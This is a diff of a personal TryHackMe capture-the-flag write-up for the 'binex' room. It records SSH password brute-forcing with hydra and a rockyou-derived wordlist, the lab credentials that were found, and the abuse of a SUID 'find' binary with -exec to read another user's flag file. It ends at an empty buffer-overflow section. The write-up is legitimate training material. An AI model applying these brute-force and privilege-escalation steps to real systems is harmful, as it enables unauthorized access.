@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/binex/","created":"2026-04-04T18:56:56.357+02:00","updated":"2026-04-04T21:21:24.052+02:00","dg-note-properties":{}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/binex/","created":"2026-04-04T18:56:56.357+02:00","updated":"2026-04-04T22:49:08.724+02:00","dg-note-properties":{}}
 ---
 
 ![](/img/user/Attachments/redteaming2.png)
@@ -179,25 +179,134 @@ noentry    (RID 1003)
 1000+ = Regular users created on the system
 ```
 
+-------------
+
+## Exploitation
+
 Let's compile these users to a list
 
 `echo "kel\ndes\ntryhackme\nnoentry\nnobody" > users`
 
+Looking at THM room page there is a hint. 
+
+![](/img/user/Attachments/hint.png)
+
+The answer format reveals the username has **9 characters**and password **7 characters**
+
+Let's assume username is **tryhackme** 
+
 Let's generate a filtered password list based off of rockyou.txt with awk from the password criteria discovered from earlier.
 
-`awk 'length>=5 && length<=8' /usr/share/wordlists/rockyou.txt > filteredpw.txt`
+```
+awk 'length==7' /usr/share/wordlists/rockyou.txt > filteredpw.txt
+```
 
+Success! 
 
-`hydra -L users -P filteredpw.txt 10.114.173.81 ssh -t 4`
+Hydra has found the password for the user **tryhackme**
 
+```
+# Credentials
+username: tryhackme
+password: thebest
+```
 
-## Exploitation
+![](/img/user/Attachments/ssh-success.png)
+
+-----------
 
 ## Post-exploitation
 
-## Pwnage
+### Searching SUID-binaries to H4ck
 
-First flag: 
-Second flag: 
+It is known that the **intended attack path** here is SUID-binaries. Let's dig 
+
+`sudo -l` reveals nothing. tryhackme is not allowed to run anything with sudo. 
+
+**Objective**
+The objective is to target a SUID bit file
+
+`find / -perm /4000 2>/dev/null`
+
+Looking in root directory for anything with special file permissions SETUID set and casting err messages to void null.
+
+![](/img/user/Attachments/suidsearch.png)
+
+Intended target is found.
+
+![](/img/user/Attachments/bo.png)
+
+`/home/des/bof` this is the buffer overflow the room says is vulnerable
+
+Room also says to use a gnu debugger. lets identify it
+
+`wchich gdb`
+
+```
+Location: usr/bin/gdb
+```
+
+enter directory `cd /usr/bin/`
+
+Open the **bof** using the debugger
+
+`gdb /home/des/bof`
+
+![](/img/user/Attachments/gdbopen.png)
+
+It appears it is only possible to open the file as the user **des** 
+
+`find / -user des 2>/dev/null`
+
+The flag is located in des's directory so that's good to know
+
+![](/img/user/Attachments/desflaglocated.png)
+
+Looking again for SUID binaries which can be exploited as **tryhackme** user 
+
+`find / -perm /4000 -user des 2>/dev/null`
+
+So it seems the binary of interest here is find. This shows that the *find* binary is owned by des but *tryhackme* can run it. Let's exploit it. 
+
+![](/img/user/Attachments/find.png)
+
+Looking to GTFOBins a useful command is found and leads to success! Credentials are found by exploiting the **find** binary to read the **flag.txt** in des home directory
+
+### 1st Flag is 0wned
+
+`find /home/des/flag.txt -exec cat {} \;`
+
+```
+Good job on exploiting the SUID file. Never assign +s to any system executable fil  
+es. Remember, Check gtfobins.  
+  
+You flag is THM{exploit_the_SUID}  
+  
+login crdential (In case you need it)  
+username: des  
+password: destructive_72656275696c64
+```
+
+
+![](/img/user/Attachments/credsfoundfrom-flag.png)
+
+
+### Binary 2 : Buffer Overflow
+
+**Hint**
+
+![](/img/user/Attachments/hint2.png)
+
+Credentials for user *des* is also given
+
+```
+# Credentials for Des
+username: des
+password: destructive_72656275696c64
+```
+
+#### Lets pivot 
+
+
 
 ## Attack Pattern Analysis (APA)
